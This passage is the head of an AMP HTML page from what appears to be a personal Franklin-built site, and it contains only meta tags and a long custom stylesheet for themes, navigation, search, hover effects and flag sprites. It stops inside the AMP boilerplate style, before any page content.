<!doctypehtml><html prefix="og: https://ogp.me/ns# article: http://ogp.me/ns/article# website: http://ogp.me/ns/website#"amp lang=de><script async src=https://cdn.ampproject.org/v0.js></script><meta charset=utf-8><meta content=width=device-width,minimum-scale=1,initial-scale=1 name=viewport><style amp-custom>.hljs{display:block;font-size:14px;line-height:1.45em;overflow-x:auto;padding:.5em;color:var(--text-color);background:var(--block-background)}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:var(--text-color);font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:var(--text-color);font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}:root{--block-background: var(--accent2);--small: 14px;--normal: 19px;--text-color: hsv(0, 0%, 20%)}.franklin-content .row{display:block}.franklin-content .left{float:left;margin-right:15px}.franklin-content .right{float:right}.franklin-content .container img{width:auto;padding-left:0;border-radius:10px}.franklin-content .footnote{position:relative;top:-.5em;font-size:70%}.franklin-toc li{margin:.6rem 0}.franklin-content{position:relative;padding-left:12.5%;padding-right:12.5%;line-height:1.35em}@media (min-width: 940px){.franklin-content{width:705px;margin-left:auto;margin-right:auto}}@media (max-width: 480px){.franklin-content{padding-left:6%;padding-right:6%}}.franklin-content h1{font-size:24px}.franklin-content h2{font-size:22px}.franklin-content h3{font-size:20px}.franklin-content h1,h2,h3,h4,h5,h6{text-align:left}.franklin-content h1{padding-bottom:.5em;border-bottom:3px double lightgrey;margin-top:1.5em;margin-bottom:1em}.franklin-content h2{padding-bottom:.3em;border-bottom:1px solid lightgrey;margin-top:2em;margin-bottom:1em}.franklin-content h1 a{color:inherit}.franklin-content h1 a:hover{text-decoration:none}.franklin-content h2 a{color:inherit}.franklin-content h2 a:hover{text-decoration:none}.franklin-content h3 a{color:inherit}.franklin-content h3 a:hover{text-decoration:none}.franklin-content h4 a{color:inherit}.franklin-content h4 a:hover{text-decoration:none}.franklin-content h5 a{color:inherit}.franklin-content h5 a:hover{text-decoration:none}.franklin-content h6 a{color:inherit}.franklin-content h6 a:hover{text-decoration:none}.franklin-content table{margin-left:auto;margin-right:auto;border-collapse:collapse;text-align:center}.franklin-content table *{line-height:.75rem}.franklin-toc ol ol{list-style-type:lower-alpha}.franklin-content th,td{font-size:var(--small);padding:10px;border:1px solid black}.franklin-content blockquote{background:var(--block-background);border-left:7px solid #a8a8a8;margin:1.5em 10px;padding:.5em 10px;font-style:italic}.franklin-content blockquote p{display:inline}.franklin-content li p{margin:10px 0}.franklin-content a{color:var(--alt2);text-decoration:none}.franklin-content a:hover{text-decoration:underline}.franklin-content .eqref a{color:green}.franklin-content .bibref a{color:green}.franklin-content sup{font-size:70%;vertical-align:super;line-height:0}.franklin-content sup a.fnref,.franklin-content td.fndef-backref a{overflow:visible;display:initial;padding-bottom:.3rem;padding-top:.2rem}.franklin-content table.fndef{margin:0 0 10px}.franklin-content .fndef tr,td{padding:0;border:0;text-align:left}.franklin-content .fndef tr{border-left:2px solid lightgray}.franklin-content .fndef td.fndef-backref{vertical-align:top;font-size:70%;padding-left:5px}.franklin-content .fndef td.fndef-content{font-size:80%;padding-left:10px;width:100%}.franklin-content img{width:70%;text-align:center;padding-left:10%}.franklin-content .img-small img{width:50%;text-align:center;padding-left:20%}body{counter-reset:eqnum}.katex{font-size:1em}.katex-display .katex{display:inline-block;white-space:normal}.katex-display:after{counter-increment:eqnum;content:"(" counter(eqnum) ")";position:relative;float:right;padding-right:5px}code{background-color:var(--block-background);padding:.1em .2em;border-radius:2px;font-size:var(--small);overflow:auto}code.plaintext{display:block}.scrollbox{width:10em;height:10em;overflow:auto;visibility:hidden}.scrollbox-content,.scrollbox:hover,.scrollbox:focus{visibility:visible}.scrollbox_delayed{transition:visibility .2s}.scrollbox_delayed:hover{transition:visibility 0s .2s}.hljs{font-size:var(--small);line-height:1.35em;border-radius:10px}.hljs-meta,.hljs-metas,.hljs-metap{font-weight:bold}.hljs-meta{color:#19b333}.hljs-metas{color:red}.hljs-metap{color:#3383e7}.franklin-content .colbox-blue{background-color:#eef3f5;padding:5px 10px;margin-left:5px;margin-top:5px;margin-bottom:5px;border-radius:0 10px 10px 0;border-left:5px solid #4c9cf1}body.light{--accent: #3152ff;--accent2: #5a61ae;--accent3: #651b00;--alt: #ae6600;--alt2: #9e6c47;--alt3: #7f4200;--alt4: #ffbebe;--background-color: #ffebee;--foreground-color: #1c0005;--block-background: #423833;--red: #e42a2f;--yellow: #917329;--green: #29892d}@media (prefers-color-scheme: light){body{--accent: #3152ff;--accent2: #5a61ae;--accent3: #651b00;--alt: #ae6600;--alt2: #9e6c47;--alt3: #7f4200;--background-color: #ffebee;--foreground-color: #1c0005;--block-background: #423833;--red: #e42a2f;--yellow: #917329;--green: #29892d}}body.dark{--accent: #72e200;--accent2: #add3a0;--accent3: #7a9eff;--alt: #8abeff;--alt2: #836bd1;--alt3: #a090de;--background-color: #001d49;--foreground-color: #dae2ff;--block-background: #011627;--red: #e42a2f;--yellow: #917329;--green: #29892d}@media (prefers-color-scheme: dark){body{--accent: #72e200;--accent2: #add3a0;--accent3: #7a9eff;--alt: #8abeff;--alt2: #836bd1;--alt3: #a090de;--background-color: #001d49;--foreground-color: #dae2ff;--block-background: #011627;--red: #e42a2f;--yellow: #917329;--green: #29892d}}body{background:var(--background-color);font-style:var(--accent);font-family:Helvetica;padding:0 .5rem;line-height:2rem;color:var(--accent3);max-width:1280px;min-height:720px;margin:auto;min-width:320px}a{color:var(--accent)}a:visited{color:var(--accent2)}.author__place .author__bio{font-size:1rem}.franklin-content blockquote{border-left-color:var(--accent)}.franklin-content{color:var(--foreground-color)}.franklin-content #title a,.franklin-content .header-anchor{padding:.5rem;line-height:100%}.franklin-content a{outline-style:outset;outline-width:1px;padding:0 .1rem;margin:0 .1rem;outline-color:var(--alt2)}.franklin-content img{width:auto;text-align:center;padding:0}body>div>h1{text-align:center;color:var(--accent2)}body>div #title,body>div #page-description{text-align:center}.page__footer{margin-top:1rem;padding-top:1rem}.franklin-content .intro{font-size:1.2rem;text-align:left}.franklin-content .intro ul{list-style-type:none;font-size:1.1rem;font-style:italic}.franklin-content .intro a{font-variant:small-caps;padding-bottom:.2rem;font-size:1.4rem;font-style:normal}.franklin-content .intro .icon{padding:0 .2rem;font-size:1rem}.franklin-content .active-projects ul h4{font-size:1.5rem;font-variant:small-caps;font-style:normal;margin:.2rem}.franklin-content h3{font-size:.9rem}.posts_list h3{text-align:center}.svg-inline--fa.icon{width:1rem}.masthead__menu{height:4rem;line-height:4rem;padding:10px 0;position:relative}.site-title{float:left;font-weight:bold;width:15rem;font-size:1.5rem;text-decoration:none;color:var(--accent)}.site-title:visited{color:var(--accent)}#site-nav{float:right;font-size:1.5rem;font-family:Courier New;font-weight:bold;position:absolute;right:0}#site-nav .horiz ul{list-style-type:none;line-height:4rem;height:4rem;margin:0}#site-nav .horiz ul>li{padding:0 .5rem;box-shadow:.25rem -.025rem .05rem var(--alt)}#site-nav .horiz ul>li{float:left;border-top:0;border-bottom:0;border-left:0;border-radius:50% 25% 25% 50%}#site-nav ul>li>a,#site-nav ul>li>button{color:var(--alt);display:inline-block}#site-nav .menu-icons{position:relative;padding:0 .2rem}#site-nav{display:block;width:auto;height:auto}.masthead__inner-wrap{display:block;width:100%;padding:10px 0;height:inherit}.author__avatar>img{width:4em;height:4em;border-radius:50%;object-fit:cover;border-width:.1rem;border-color:var(--accent3);border-style:solid;box-shadow:.1rem .06rem var(--accent3),-.05rem -.025rem .2rem var(--accent3)}#site-nav a:link{text-decoration:none}#site-nav .vert,#site-nav .ham{display:none}.author__avatar{object-fit:contain;float:left}.author__name{display:none}.author__place{font-size:.65em}.author__wrap>ul{float:left;height:inherit;margin:0;padding:0 10px}.author__wrap>ul>li{position:relative;float:left;list-style-type:none;font-size:1rem;padding:0 .2rem;text-align:center}.page__footer ul>li{list-style-type:none}ul>li.author__urls{font-size:2rem}ul>li.author__urls a:visited{color:var(--accent)}ul>li.author__urls a:hover{filter:drop-shadow(.1rem .1rem 0 var(--accent2)) brightness(1.5);filter:brightness(1.5);transition-property:-moz-filter,-ms-filter,-o-filter,-webkit-filter,filter;transition-duration:.2s}ul>li.author__place a{color:var(--accent3);text-decoration:none;text-shadow:0 0 .01rem var(--alt2)}.author__wrap .author__avatar{float:left}.langs-dropdown-wrapper{cursor:pointer}.langs-dropdown-content{display:none;text-align:left}.langs-dropdown-content.show{display:block}.langs-dropdown-content a{display:block}.menu-lang-btn:before{border-radius:25% 25% 25% 50%}@media (max-width: 680px){.lang-link{height:3rem}}.lang-link .flag-icon,.lang-link .flag{position:absolute;left:1rem;margin-top:.65rem}#site-nav .langs-dropdown-menu{left:1.5rem;position:relative;top:1rem}#site-nav .langs-dropdown-menu .lang-list{font-size:1rem;line-height:2rem;overflow-x:hidden;height:20rem;position:absolute;overflow-y:scroll;right:1rem;scrollbar-width:thin;border:solid;border-radius:25%;border-width:0 0 0 .25rem;transition:height;padding-left:3rem}#site-nav .langs-dropdown-menu .lang-link:hover{color:var(--foreground-color)}.lang-list{background-color:var(--background-color)}#site-nav ul>li>button{background:inherit;border:inherit;font-size:inherit;font-family:inherit;font-weight:inherit;padding:inherit;margin:inherit;list-style-type:inherit;line-height:inherit;height:inherit}.page-foot{font-size:.7em;line-height:1.25em;text-align:right;display:inline-block;width:100%}.franklin-content{padding:0 0 2rem;z-index:0}.franklin-content,.tag-content{padding-top:1rem}.author__bio li{list-style:none}.author__bio li p{margin:0;padding:0}#tag-name{font-size:1.5rem;padding:.5rem;font-weight:bold;font-variant:small-caps}#tag_title{font-variant:small-caps}#tag_title .wrap{text-align:left}#tag_title>.wrap>*{display:inline-block;text-align:left}#tag_cloud{font-weight:bold}.posts_list.franklin-content>ul{list-style-type:"> "}.posts_list.franklin-content>.title{font-variant:small-caps}.posts_list.franklin-content>.title>h2{font-size:1rem;font-style:italic}.posts_list.franklin-content>.title>h2,.posts_list.franklin-content>.title>a>h1{display:inline}.posts_list.franklin-content>ul>li{line-height:1.2rem;padding:.1rem}.posts_list.franklin-content>ul>li>p{padding:.1rem;margin:.1rem}.posts_list.franklin-content>.title>h2,.posts_list.franklin-content>.title{text-align:center;display:block;margin:1rem}.page__footer-links>ul>li>a{padding:.2rem;margin:.2rem}#tag_cloud>a{padding:.2rem;font-variant:small-caps;vertical-align:middle;margin:.3rem;display:inline-block;text-decoration:none;text-shadow:0 0 5rem white}#tag_cloud .icon{font-size:1rem;vertical-align:middle;margin-right:.2rem;margin-left:.2rem}#tag_cloud_wrapper{display:inline-block;width:100%;text-align:center}#post-tags-list{font-variant:small-caps;font-weight:bold}.media{font-size:1.5rem;line-height:2rem}#library .book-author{color:var(--accent2);font-size:.9rem;display:inline}.shows_list h3{font-size:1.5rem}a.imdb{padding:0 .5rem}#searchResults ul li{margin-bottom:1rem}.lunrSearchForm{margin-right:-.4rem;font-size:0;overflow:hidden}.lunrSearchForm .search-input{background:var(--background-color);color:var(--alt);border-width:.2rem;border:none;outline:none;border-radius:50% 25% 25% 50%;line-height:1.75rem;padding:.5rem 0 .5rem 2.25rem;width:7rem;position:relative;top:.5rem;font-family:"Courier New";font-weight:bold;font-size:1.5rem}.lunrSearchForm .search-input:focus{background:var(--block-background)}.lunrSearchForm .search-button{color:var(--alt);background:none;border:none;font-size:1.5rem;padding:.2rem .2rem .2rem 0;position:absolute;top:1rem;left:.75rem;z-index:1;cursor:pointer}.lunrSearchForm .search-button:focus{color:var(--accent)}@media (min-width: 680px) and (max-width: 1300px){.lunrSearchForm .search-input{font-size:1rem;padding-left:2.75rem;width:4.5rem;border-radius:50% 100% 100% 50%}}@media (max-width: 680px){.lunrSearchForm{display:block;width:28rem}.lunrSearch{position:absolute;top:-4rem;display:block;left:0;width:calc(2rem + 90%)}.lunrSearch .search-input{width:26rem}}@media (max-width: 480px){.lunrSearchForm .search-input{width:18rem;left:-4rem}}.result-title a{text-decoration:none}.result-title a:hover{text-decoration:underline}.result-preview{color:gray}.resultCount{color:gray}.result-query{font-weight:bold}.lunrSearchForm{margin-top:1em}footer>*{float:left}footer a{text-decoration:underline dotted}footer ul.author__wrap>li{float:left;padding:0 .2rem}footer ul.author__wrap>li a{line-height:2rem;height:inherit;display:block}footer ul.author__wrap{float:right;margin:0}footer .page__footer-copyright{margin:0}footer .page__footer-links{margin:0 .2rem 0 .4rem}footer .page__footer-links ul{display:inline;margin:0 .4rem 0 0;padding:0}footer .page__footer-links li{display:inline}@media (min-width: 680px){#tag-name,.tag-desc{text-align:left}}@media (min-width: 680px) and (max-width: 1300px){body{max-width:640px;min-height:320px}#site-nav{position:relative;z-index:1}#site-nav .ham:hover{cursor:pointer}#site-nav .ham{outline:none}#site-nav .ham,#site-nav .ham-icon{display:block;height:3rem;line-height:3rem;position:absolute;right:0;top:0;text-align:right;background:transparent;border:none;font-size:3rem;color:var(--accent)}#site-nav .horiz{display:none}#site-nav .vert{display:block;float:none;position:absolute;right:0;top:3rem;width:9rem;padding-left:1rem;max-height:0rem;overflow:hidden;filter:blur(1rem);transition:max-height .33s ease-in,filter .33s ease-in}#site-nav .vert ul{margin:0;padding:10px 0}#site-nav .vert ul>li{width:100%;text-align:center;border-radius:25% 50% 50% 25%;adding:.5rem 1rem;box-shadow:-.25rem 0 .05rem var(--alt)}}@media (max-width: 680px){.masthead,.masthead__inner-wrap,.masthead__menu{display:block}.site-title{float:none;width:100%;display:block;text-align:center}.author__wrap{float:none;display:block;width:100%;height:4.4rem;text-align:center}.author__wrap ul{width:auto;float:none;padding:0;display:inline-block}#tag-name,.tag-desc{text-align:center}#site-nav{float:none;padding:10px 0;position:relative;top:4rem}#site-nav ul li{float:none}.horiz{text-align:center}#site-nav ul{display:inline-block;padding:0}.masthead{height:14rem}.page__footer{width:100%;display:block}.page__footer{text-align:center}footer{display:inline-block;text-align:center}footer>*{display:inline-block;float:none}footer ul.author__wrap{float:none}footer .author__urls.social-icons{font-size:1rem}.page-foot .copyright{display:inline-block}}@media (max-width: 480px){.masthead{height:30rem}#site-nav{top:5rem}#site-nav .horiz ul{width:100%}#site-nav .horiz ul>li{width:calc(100% - 2rem);float:none}}@media (min-width: 480px) and (max-width: 680px){.masthead{height:20rem}}@media (max-width: 680px){body{overflow-x:hidden}#site-nav{z-index:1}#site-nav .horiz ul>li{float:none;top:-4rem;position:relative;margin-top:1rem;margin-bottom:0}footer ul.author__wrap{margin-top:1rem;text-align:center;margin-left:0;padding-left:0}footer ul.author__wrap>li{float:none;display:inline-block}.page__footer{margin-top:3.5rem}}.site-title{-webkit-backface-visibility:hidden;backface-visibility:hidden;font-size:1.5rem;font-family:"VT323",monospace,sans-serif;color:var(--accent2);-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.site-title:after{content:"​";position:relative;padding-right:.5em;border-right:.5em solid var(--accent);white-space:nowrap;-webkit-animation:chars 5.52s linear 1s forwards,cursor 1s 3;animation:chars 5.52s linear 1s forwards,cursor 1s 3}.hvr-buzz-out{display:inline-block;vertical-align:middle;-webkit-transform:perspective(1px) translateZ(0);transform:perspective(1px) translateZ(0);box-shadow:0 0 1px #0000}.hvr-buzz-out:hover,.hvr-buzz-out:focus,.hvr-buzz-out:active{-webkit-animation-name:hvr-buzz-out;animation-name:hvr-buzz-out;-webkit-animation-duration:.75s;animation-duration:.75s;-webkit-animation-timing-function:linear;animation-timing-function:linear;-webkit-animation-iteration-count:1;animation-iteration-count:1}.franklin-content a{display:inline-block;vertical-align:middle;text-decoration:none;-webkit-transform:perspective(1px) translateZ(0);transform:perspective(1px) translateZ(0);box-shadow:0 0 1px var(--alt2);position:relative;overflow:hidden}.franklin-content a:before{content:"";position:absolute;z-index:-1;left:51%;right:51%;bottom:0;background:var(--accent);height:4px;-webkit-transition-property:left,right;transition-property:left,right;-webkit-transition-duration:.3s;transition-duration:.3s;-webkit-transition-timing-function:ease-out;transition-timing-function:ease-out}.franklin-content a:hover:before,.franklin-content a:focus:before,.franklin-content a:active:before{left:0;right:0}.hvr-outline-in{display:inline-block;vertical-align:middle;-webkit-transform:perspective(1px) translateZ(0);transform:perspective(1px) translateZ(0);box-shadow:0 0 1px var(--alt2);position:relative}.horiz .hvr-outline-in:before{border-radius:50% 25% 25% 50%;right:-.25rem}.vert .hvr-outline-in:before{border-radius:25% 50% 50% 25%;left:-.25rem}.hvr-outline-in:before{pointer-events:none;content:"";position:absolute;border:var(--alt) solid .25rem;top:0;bottom:0;left:0;opacity:0;-webkit-transition-duration:.2s;transition-duration:.2s;-webkit-transition-property:top,right,bottom,left;transition-property:top,right,bottom,left}.horiz .hvr-outline-in:hover:before,.horiz .hvr-outline-in:focus:before,.horiz .hvr-outline-in:active:before{top:-.5rem;right:-.5rem;bottom:-.5rem;left:0;opacity:1}.vert .hvr-outline-in:hover:before,.vert .hvr-outline-in:focus:before,.vert .hvr-outline-in:active:before{top:-.5rem;right:0;bottom:-.5rem;left:-.5rem;opacity:1}#site-nav .vert:before{background-color:var(--background-color);filter:blur(.25rem);content:"";height:100%;width:100%;position:absolute}.author__avatar{background-color:transparent;perspective:1000px}.masthead__menu ul li.author__avatar img{transition:transform .8s;transform-style:preserve-3d}.masthead__menu li.author__avatar:hover img{transform:rotateY(180deg);cursor:pointer}body.light .hljs{display:block;overflow-x:auto;padding:.5em;color:#000;background:#f8f8ff}body.light .hljs-comment,body.light .hljs-quote{color:#408080;font-style:italic}body.light .hljs-keyword,body.light .hljs-literal,body.light .hljs-selector-tag,body.light .hljs-subst{color:#954121}body.light .hljs-number{color:#40a070}body.light .hljs-doctag,body.light .hljs-string{color:#219161}body.light .hljs-section,body.light .hljs-selector-class,body.light .hljs-selector-id,body.light .hljs-type{color:#19469d}body.light .hljs-params{color:#00f}body.light .hljs-title{color:#458;font-weight:700}body.light .hljs-attribute,body.light .hljs-name,body.light .hljs-tag{color:navy;font-weight:400}body.light .hljs-template-variable,body.light .hljs-variable{color:teal}body.light .hljs-link,body.light .hljs-regexp{color:#b68}body.light .hljs-bullet,body.light .hljs-symbol{color:#990073}body.light .hljs-built_in,body.light .hljs-builtin-name{color:#0086b3}body.light .hljs-meta{color:#999;font-weight:700}body.light .hljs-deletion{background:#fdd}body.light .hljs-addition{background:#dfd}body.light .hljs-emphasis{font-style:italic}body.light .hljs-strong{font-weight:700}.flag{display:inline-block;position:relative;width:16px;height:11px;background:url(/assets/flags.png) no-repeat}.flag.flag-gu{background-position:-96px -55px}.flag.flag-mn{background-position:-208px -88px}.flag.flag-va{background-position:-48px -154px}.flag.flag-tibet{background-position:-32px -143px}.flag.flag-fo{background-position:-64px -44px}.flag.flag-th{background-position:-16px -143px}.flag.flag-tr{background-position:-144px -143px}.flag.flag-tl{background-position:-80px -143px}.flag.flag-kz{background-position:-144px -77px}.flag.flag-zm{background-position:-16px -165px}.flag.flag-uz{background-position:-32px -154px}.flag.flag-dk{background-position:-64px -33px}.flag.flag-scotland{background-position:-176px -121px}.flag.flag-gi{background-position:-224px -44px}.flag.flag-gy{background-position:-128px -55px}.flag.flag-bj{background-position:-112px -11px}.flag.flag-fr{background-position:-80px -44px}.flag.flag-mo{background-position:-224px -88px}.flag.flag-ir{background-position:-112px -66px}.flag.flag-io{background-position:-80px -66px}.flag.flag-tm{background-position:-96px -143px}.flag.flag-ch{background-position:-96px -22px}.flag.flag-mt{background-position:-32px -99px}.flag.flag-nl{background-position:-240px -99px}.flag.flag-gp{background-position:-16px -55px}.flag.flag-im{background-position:-48px -66px}.flag.flag-tv{background-position:-176px -143px}.flag.flag-mu{background-position:-48px -99px}.flag.flag-pe{background-position:-96px -110px}.flag.flag-vi{background-position:-112px -154px}.flag.flag-hn{background-position:-176px -55px}.flag.flag-ss{background-position:-128px -132px}.flag.flag-ae{background-position:-16px 0}.flag.flag-td{background-position:-240px -132px}.flag.flag-pw{background-position:0 -121px}.flag.flag-nu{background-position:-32px -110px}.flag.flag-bt{background-position:-208px -11px}.flag.flag-ms{background-position:-16px -99px}.flag.flag-cv{background-position:-240px -22px}.flag.flag-es{background-position:-224px -33px}.flag.flag-mh{background-position:-144px -88px}.flag.flag-la{background-position:-160px -77px}.flag.flag-vn{background-position:-128px -154px}.flag.flag-py{background-position:-16px -121px}.flag.flag-br{background-position:-176px -11px}.flag.flag-ye{background-position:-224px -154px}.flag.flag-ie{background-position:0 -66px}.flag.flag-gh{background-position:-208px -44px}.flag.flag-cg{background-position:-80px -22px}.flag.flag-cu{background-position:-224px -22px}.flag.flag-hu{background-position:-224px -55px}.flag.flag-sg{background-position:-224px -121px}.flag.flag-at{background-position:-176px 0}.flag.flag-lk{background-position:-224px -77px}.flag.flag-vu{background-position:-144px -154px}.flag.flag-bo{background-position:-160px -11px}.flag.flag-jo{background-position:-208px -66px}.flag.flag-er{background-position:-208px -33px}.flag.flag-za{background-position:-256px -154px}.flag.flag-rs{background-position:-80px -121px}.flag.flag-nr{background-position:-16px -110px}.flag.flag-ls{background-position:-256px -77px}.flag.flag-jm{background-position:-192px -66px}.flag.flag-tz{background-position:-208px -143px}.flag.flag-ki{background-position:-16px -77px}.flag.flag-sj{background-position:0 -132px}.flag.flag-cz{background-position:-16px -33px}.flag.flag-pg{background-position:-128px -110px}.flag.flag-lv{background-position:-32px -88px}.flag.flag-do{background-position:-96px -33px}.flag.flag-lu{background-position:-16px -88px}.flag.flag-no{background-position:-256px -99px}.flag.flag-kw{background-position:-112px -77px}.flag.flag-mx{background-position:-96px -99px}.flag.flag-yt{background-position:-240px -154px}.flag.flag-ly{background-position:-48px -88px}.flag.flag-cy{background-position:0 -33px}.flag.flag-ph{background-position:-144px -110px}.flag.flag-my{background-position:-112px -99px}.flag.flag-sm{background-position:-48px -132px}.flag.flag-et{background-position:-240px -33px}.flag.flag-ru{background-position:-96px -121px}.flag.flag-tj{background-position:-48px -143px}.flag.flag-ai{background-position:-64px 0}.flag.flag-pl{background-position:-176px -110px}.flag.flag-kp{background-position:-64px -77px}.flag.flag-uy{background-position:-16px -154px}.flag.flag-gb{background-position:-112px -44px}.flag.flag-gs{background-position:-64px -55px}.flag.flag-kurdistan{background-position:-96px -77px}.flag.flag-rw{background-position:-112px -121px}.flag.flag-ec{background-position:-128px -33px}.flag.flag-mm{background-position:-192px -88px}.flag.flag-pa{background-position:-80px -110px}.flag.flag-wales{background-position:-160px -154px}.flag.flag-kg{background-position:-256px -66px}.flag.flag-ve{background-position:-80px -154px}.flag.flag-tk{background-position:-64px -143px}.flag.flag-ca{background-position:-16px -22px}.flag.flag-is{background-position:-128px -66px}.flag.flag-ke{background-position:-240px -66px}.flag.flag-ro{background-position:-64px -121px}.flag.flag-gq{background-position:-32px -55px}.flag.flag-pt{background-position:-256px -110px}.flag.flag-tf{background-position:-256px -132px}.flag.flag-ad{background-position:0 0}.flag.flag-sk{background-position:-16px -132px}.flag.flag-pm{background-position:-192px -110px}.flag.flag-om{background-position:-64px -110px}.flag.flag-an{background-position:-112px 0}.flag.flag-ws{background-position:-192px -154px}.flag.flag-sh{background-position:-240px -121px}.flag.flag-mp{background-position:-240px -88px}.flag.flag-gt{background-position:-80px -55px}.flag.flag-cf{background-position:-64px -22px}.flag.flag-zanzibar{background-position:0 -165px}.flag.flag-mw{background-position:-80px -99px}.flag.flag-catalonia{background-position:-32px -22px}.flag.flag-ug{background-position:-240px -143px}.flag.flag-je{background-position:-176px -66px}.flag.flag-km{background-position:-32px -77px}.flag.flag-in{background-position:-64px -66px}.flag.flag-bf{background-position:-48px -11px}.flag.flag-mc{background-position:-80px -88px}.flag.flag-sy{background-position:-192px -132px}.flag.flag-sn{background-position:-64px -132px}.flag.flag-kr{background-position:-80px -77px}.flag.flag-eu{background-position:-256px -33px}.flag.flag-bn{background-position:-144px -11px}.flag.flag-st{background-position:-144px -132px}.flag.flag-england{background-position:-192px -33px}.flag.flag-lc{background-position:-192px -77px}.flag.flag-dm{background-position:-80px -33px}.flag.flag-be{background-position:-32px -11px}.flag.flag-ni{background-position:-224px -99px}.flag.flag-ua{background-position:-224px -143px}.flag.flag-mz{background-position:-128px -99px}.flag.flag-pf{background-position:-112px -110px}.flag.flag-tn{background-position:-112px -143px}.flag.flag-ee{background-position:-144px -33px}.flag.flag-xk{background-position:-208px -154px}.flag.flag-sx{background-position:-176px -132px}.flag.flag-sd{background-position:-192px -121px}.flag.flag-gd{background-position:-128px -44px}.flag.flag-ci{background-position:-112px -22px}.flag.flag-sz{background-position:-208px -132px}.flag.flag-cl{background-position:-144px -22px}.flag.flag-fi{background-position:0 -44px}.flag.flag-ga{background-position:-96px -44px}.flag.flag-jp{background-position:-224px -66px}.flag.flag-de{background-position:-32px -33px}.flag.flag-np{background-position:0 -110px}.flag.flag-re{background-position:-48px -121px}.flag.flag-bg{background-position:-64px -11px}.flag.flag-sc{background-position:-160px -121px}.flag.flag-ng{background-position:-208px -99px}.flag.flag-qa{background-position:-32px -121px}.flag.flag-mk{background-position:-160px -88px}.flag.flag-aw{background-position:-208px 0}.flag.flag-kn{background-position:-48px -77px}.flag.flag-al{background-position:-80px 0}.flag.flag-bw{background-position:-240px -11px}.flag.flag-um{background-position:-256px -143px}.flag.flag-ky{background-position:-128px -77px}.flag.flag-tt{background-position:-160px -143px}.flag.flag-so{background-position:-80px -132px}.flag.flag-lt{background-position:0 -88px}.flag.flag-by{background-position:-256px -11px}.flag.flag-bb{background-position:0 -11px}.flag.flag-us{background-position:0 -154px}.flag.flag-md{background-position:-96px -88px}.flag.flag-ag{background-position:-48px 0}.flag.flag-hm{background-position:-160px -55px}.flag.flag-as{background-position:-160px 0}.flag.flag-eg{background-position:-160px -33px}.flag.flag-sv{background-position:-160px -132px}.flag.flag-sl{background-position:-32px -132px}.flag.flag-fk{background-position:-32px -44px}.flag.flag-am{background-position:-96px 0}.flag.flag-ck{background-position:-128px -22px}.flag.flag-tw{background-position:-192px -143px}.flag.flag-kh{background-position:0 -77px}.flag.flag-to{background-position:-128px -143px}.flag.flag-se{background-position:-208px -121px}.flag.flag-cd{background-position:-48px -22px}.flag.flag-pn{background-position:-208px -110px}.flag.flag-gr{background-position:-48px -55px}.flag.flag-id{background-position:-256px -55px}.flag.flag-vc{background-position:-64px -154px}.flag.flag-somaliland{background-position:-96px -132px}.flag.flag-bi{background-position:-96px -11px}.flag.flag-pk{background-position:-160px -110px}.flag.flag-pr{background-position:-224px -110px}.flag.flag-bd{background-position:-16px -11px}.flag.flag-co{background-position:-192px -22px}.flag.flag-fm{background-position:-48px -44px}.flag.flag-bm{background-position:-128px -11px}.flag.flag-ar{background-position:-144px 0}.flag.flag-bv{background-position:-224px -11px}.flag.flag-sb{background-position:-144px -121px}.flag.flag-mq{background-position:-256px -88px}.flag.flag-eh{background-position:-176px -33px}.flag.flag-bh{background-position:-80px -11px}.flag.flag-it{background-position:-144px -66px}.flag.flag-hr{background-position:-192px -55px}.flag.flag-sa{background-position:-128px -121px}.flag.flag-mv{background-position:-64px -99px}.flag.flag-mg{background-position:-128px -88px}.flag.flag-dz{background-position:-112px -33px}.flag.flag-gg{background-position:-192px -44px}.flag.flag-gm{background-position:-256px -44px}.flag.flag-af{background-position:-32px 0}.flag.flag-li{background-position:-208px -77px}.flag.flag-sr{background-position:-112px -132px}.flag.flag-vg{background-position:-96px -154px}.flag.flag-cr{background-position:-208px -22px}.flag.flag-tc{background-position:-224px -132px}.flag.flag-ao{background-position:-128px 0}.flag.flag-ma{background-position:-64px -88px}.flag.flag-mr{background-position:0 -99px}.flag.flag-gn{background-position:0 -55px}.flag.flag-ne{background-position:-176px -99px}.flag.flag-nf{background-position:-192px -99px}.flag.flag-wf{background-position:-176px -154px}.flag.flag-hk{background-position:-144px -55px}.flag.flag-gf{background-position:-160px -44px}.flag.flag-ps{background-position:-240px -110px}.flag.flag-ic{background-position:-240px -55px}.flag.flag-cw{background-position:-256px -22px}.flag.flag-ml{background-position:-176px -88px}.flag.flag-ax{background-position:-224px 0}.flag.flag-gl{background-position:-240px -44px}.flag.flag-dj{background-position:-48px -33px}.flag.flag-cn{background-position:-176px -22px}.flag.flag-ht{background-position:-208px -55px}.flag.flag-lr{background-position:-240px -77px}.flag.flag-tg{background-position:0 -143px}.flag.flag-ba{background-position:-256px 0}.flag.flag-ge{background-position:-144px -44px}.flag.flag-bz{background-position:0 -22px}.flag.flag-au{background-position:-192px 0}.flag.flag-iq{background-position:-96px -66px}.flag.flag-cm{background-position:-160px -22px}.flag.flag-gw{background-position:-112px -55px}.flag.flag-az{background-position:-240px 0}.flag.flag-na{background-position:-144px -99px}.flag.flag-fj{background-position:-16px -44px}.flag.flag-zw{background-position:-32px -165px}.flag.flag-bs{background-position:-192px -11px}.flag.flag-il{background-position:-16px -66px}.flag.flag-nz{background-position:-48px -110px}.flag.flag-me{background-position:-112px -88px}.flag.flag-si{background-position:-256px -121px}.flag.flag-nc{background-position:-160px -99px}.flag.flag-lb{background-position:-176px -77px}</style><style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal 